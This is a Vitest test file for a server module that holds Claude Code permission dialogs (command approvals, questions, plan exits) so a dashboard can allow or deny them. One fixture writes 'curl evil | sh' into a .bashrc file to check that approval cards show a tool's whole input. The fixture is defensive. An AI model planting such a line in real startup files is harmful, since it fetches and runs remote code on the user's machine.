import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { DialogHolds, HOLD_LIMIT_MS, type HeldCall } from "../../src/server/dialog-holds.js";

const SESSION = "s1";
const BASH: HeldCall = { session_id: SESSION, tool_name: "Bash", tool_input: { command: "rmdir /x", description: "d" } };
const QUESTIONS = [
  { header: "Shape", question: "Which shape?", multiSelect: false, options: [{ label: "Circle" }, { label: "Square" }] },
  { header: "Colour", question: "Which colours?", multiSelect: true, options: [{ label: "Red" }, { label: "Blue" }] },
];
const ASK: HeldCall = { session_id: SESSION, tool_name: "AskUserQuestion", tool_input: { questions: QUESTIONS } };
const PLAN: HeldCall = { session_id: SESSION, tool_name: "ExitPlanMode", tool_input: { plan: "# Do it", planFilePath: "/p" } };

const decision = (behaviour: Record<string, unknown>) => ({
  hookSpecificOutput: { hookEventName: "PermissionRequest", decision: behaviour },
});

let holds: DialogHolds;
beforeEach(() => {
  holds = new DialogHolds();
  vi.useFakeTimers();
});
afterEach(() => vi.useRealTimers());

/** Whether the hook call has been answered yet. */
function track(promise: Promise<unknown>) {
  const state: { output?: unknown } = {};
  void promise.then((output) => (state.output = output));
  return state;
}
const held = () => holds.view(SESSION)!.id;

describe("answering", () => {
  it("allows an approval on a press, and only then", async () => {
    const call = holds.hold(BASH);
    const state = track(call);
    await vi.advanceTimersByTimeAsync(HOLD_LIMIT_MS - 1);
    expect(state.output).toBeUndefined();

    expect(holds.answer(held(), { decision: "allow" })).toBe("answered");
    expect(await call).toEqual(decision({ behavior: "allow" }));
    expect(holds.view(SESSION)).toBeNull();
  });

  it("answers a question with its input and every answer, keyed by question text", async () => {
    const call = holds.hold(ASK);
    const answers = { "Which shape?": "Square", "Which colours?": "Red, Blue" };
    expect(holds.answer(held(), { decision: "allow", answers })).toBe("answered");
    expect(await call).toEqual(decision({ behavior: "allow", updatedInput: { questions: QUESTIONS, answers } }));
  });

  it("hands Claude Code the notes on a picked option, for the questions asked", async () => {
    const call = holds.hold(ASK);
    const answers = { "Which shape?": "Square", "Which colours?": "Red" };
    const annotations = { "Which colours?": { notes: " darker\n" }, "Which shape?": { notes: " " }, Other: { notes: "x" } };
    expect(holds.answer(held(), { decision: "allow", answers, annotations })).toBe("answered");
    expect(await call).toEqual(
      decision({
        behavior: "allow",
        updatedInput: { questions: QUESTIONS, answers, annotations: { "Which colours?": { notes: "darker" } } },
      }),
    );
  });

  it.each([
    ["a missing answer", { "Which shape?": "Square" }],
    ["a blank answer", { "Which shape?": "Square", "Which colours?": "  " }],
    ["a key that is not a question", { "Which shape?": "Square", "Which colours?": "Red", Shape: "Circle" }],
    ["no answers", undefined],
  ])("keeps a question open on %s, which Claude Code would drop in silence", (_name, answers) => {
    void holds.hold(ASK);
    expect(holds.answer(held(), { decision: "allow", answers })).toBe("incomplete");
    expect(holds.view(SESSION)).not.toBeNull();
  });

  it("approves a plan by echoing its input, as allow alone leaves that dialog open", async () => {
    const call = holds.hold(PLAN);
    expect(holds.answer(held(), { decision: "allow" })).toBe("answered");
    expect(await call).toEqual(decision({ behavior: "allow", updatedInput: PLAN.tool_input }));
  });

  it("denies with the person's words, or with its own", async () => {
    const first = holds.hold(PLAN);
    holds.answer(held(), { decision: "deny", message: "smaller please" });
    expect(await first).toEqual(decision({ behavior: "deny", message: "smaller please" }));

    const second = holds.hold(BASH);
    holds.answer(held(), { decision: "deny" });
    expect(await second).toEqual(decision({ behavior: "deny", message: "The user said no from the dashboard." }));
  });

  it("refuses a press on a dialog that has ended, or a second press", async () => {
    expect(holds.answer("nothing", { decision: "allow" })).toBe("gone");
    const call = holds.hold(BASH);
    const id = held();
    holds.answer(id, { decision: "deny" });
    await call;
    expect(holds.answer(id, { decision: "allow" })).toBe("gone");
  });
});

describe("letting go with no decision", () => {
  it("passes at the ten-minute limit, which leaves the terminal dialog", async () => {
    const state = track(holds.hold(BASH));
    await vi.advanceTimersByTimeAsync(HOLD_LIMIT_MS);
    expect(state.output).toEqual({});
    expect(holds.view(SESSION)).toBeNull();
  });

  it("passes when the call goes away: a person's Esc or No, or the session dying", async () => {
    const abort = new AbortController();
    const state = track(holds.hold(BASH, abort.signal));
    abort.abort();
    await vi.advanceTimersByTimeAsync(0);
    expect(state.output).toEqual({});
    expect(holds.view(SESSION)).toBeNull();
  });

  it("passes when a person answered in the terminal and the tool ran", async () => {
    const state = track(holds.hold(BASH));
    holds.toolFinished(SESSION, "Bash", { description: "d", command: "rmdir /x" });
    await vi.advanceTimersByTimeAsync(0);
    expect(state.output).toEqual({});
    expect(holds.view(SESSION)).toBeNull();
  });

  it("recognises a question that came back with its answers added", async () => {
    const state = track(holds.hold(ASK));
    holds.toolFinished(SESSION, "AskUserQuestion", { questions: QUESTIONS, answers: { x: "y" } });
    await vi.advanceTimersByTimeAsync(0);
    expect(state.output).toEqual({});
  });

  it("ignores a different call, and another session's", () => {
    void holds.hold(BASH);
    holds.toolFinished(SESSION, "Bash", { command: "ls" });
    holds.toolFinished(SESSION, "Read", BASH.tool_input);
    holds.toolFinished("other", "Bash", BASH.tool_input);
    expect(holds.view(SESSION)).not.toBeNull();
  });

  it("passes when the turn ends, as it does when a dialog's countdown denies it", async () => {
    const state = track(holds.hold(BASH));
    holds.turnEnded(SESSION);
    await vi.advanceTimersByTimeAsync(0);
    expect(state.output).toEqual({});
  });

  it("passes when a dialog the pane drew stays gone, for a long command approved in the terminal", async () => {
    const state = track(holds.hold(BASH));
    holds.paneRead(SESSION, true);
    holds.paneRead(SESSION, false);
    holds.paneRead(SESSION, false);
    holds.paneRead(SESSION, true);
    holds.paneRead(SESSION, false);
    holds.paneRead(SESSION, false);
    expect(holds.view(SESSION)).not.toBeNull();
    holds.paneRead(SESSION, false);
    await vi.advanceTimersByTimeAsync(0);
    expect(state.output).toEqual({});
  });

  it("does not take a dialog the pane never drew for an answered one", () => {
    void holds.hold(BASH);
    for (let i = 0; i < 10; i++) holds.paneRead(SESSION, false);
    expect(holds.view(SESSION)).not.toBeNull();
  });

  it("never allows on any of these", async () => {
    const abort = new AbortController();
    const calls = [holds.hold(BASH, abort.signal), holds.hold({ ...BASH, tool_input: { command: "ls" } })];
    abort.abort();
    holds.turnEnded(SESSION);
    expect(await Promise.all(calls)).toEqual([{}, {}]);
  });
});

describe("what is not held", () => {
  it.each([
    ["an MCP tool, which may be one no hook can answer", { ...BASH, tool_name: "mcp__probe__tool" }],
    ["a subagent's call, whose dialog a hold could hide", { ...BASH, agent_id: "a1" }],
    ["a fork's question", { ...ASK, agent_id: "a1" }],
    ["a question it cannot read", { ...ASK, tool_input: { questions: "?" } }],
  ])("passes %s at once", async (_name, call) => {
    expect(await holds.hold(call)).toEqual({});
    expect(holds.view(SESSION)).toBeNull();
  });

  it("passes a call already gone", async () => {
    expect(await holds.hold(BASH, AbortSignal.abort())).toEqual({});
  });
});

describe("the card", () => {
  it("shows the oldest of a session's dialogs, then the next", async () => {
    const first = holds.hold(BASH);
    void holds.hold(PLAN);
    void holds.hold({ ...BASH, session_id: "other" });
    expect(holds.view(SESSION)).toMatchObject({ kind: "approval", tool: "Bash", detail: "rmdir /x" });
    holds.answer(held(), { decision: "allow" });
    await first;
    expect(holds.view(SESSION)).toMatchObject({ kind: "plan", detail: "# Do it" });
  });

  it("says when it cut what a person is approving", () => {
    void holds.hold({ ...BASH, tool_input: { command: "x".repeat(16_005) } });
    const view = holds.view(SESSION);
    expect(view).toMatchObject({ kind: "approval" });
    expect(view?.kind === "approval" && view.detail).toMatch(/… 5 more characters, shown only in the terminal$/);
  });

  it("shows a tool's whole input, as a Write's path alone would hide what is written", () => {
    void holds.hold({ session_id: SESSION, tool_name: "Write", tool_input: { file_path: "/home/x/.bashrc", content: "curl evil | sh" } });
    const view = holds.view(SESSION);
    expect(view?.kind === "approval" && view.detail).toContain("curl evil | sh");
  });

  it("carries a question's own questions", () => {
    void holds.hold(ASK);
    expect(holds.view(SESSION)).toMatchObject({ kind: "question", questions: QUESTIONS });
  });
});
